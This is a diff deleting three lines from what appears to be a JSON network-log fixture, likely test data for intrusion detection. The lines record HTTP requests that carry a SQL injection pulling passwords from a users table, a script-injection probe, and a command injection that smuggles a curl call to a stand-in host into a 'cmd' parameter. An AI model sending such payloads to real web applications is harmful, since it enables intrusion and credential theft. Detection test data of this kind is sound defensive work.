@@ -1,3 +1,0 @@
-{"event_type":"http","timestamp":"2026-08-04T08:00:00Z","src_ip":"203.0.113.11","src_port":50000,"dest_ip":"10.0.0.2","dest_port":80,"proto":"tcp","http":{"http_method":"GET","url":"/?q=UNION%20SELECT%20password%20FROM%20users","status":403}}
-{"event_type":"http","timestamp":"2026-08-04T08:00:01Z","src_ip":"203.0.113.11","src_port":50001,"dest_ip":"10.0.0.2","dest_port":80,"proto":"tcp","http":{"http_method":"GET","url":"/?q=%3Cscript%3Ealert(1)%3C/script%3E","status":200}}
-{"event_type":"http","timestamp":"2026-08-04T08:00:02Z","src_ip":"203.0.113.11","src_port":50002,"dest_ip":"10.0.0.2","dest_port":80,"proto":"tcp","http":{"http_method":"GET","url":"/run?cmd=%3Bcurl%20http%3A%2F%2Fexample.test%2Fx","status":500}}
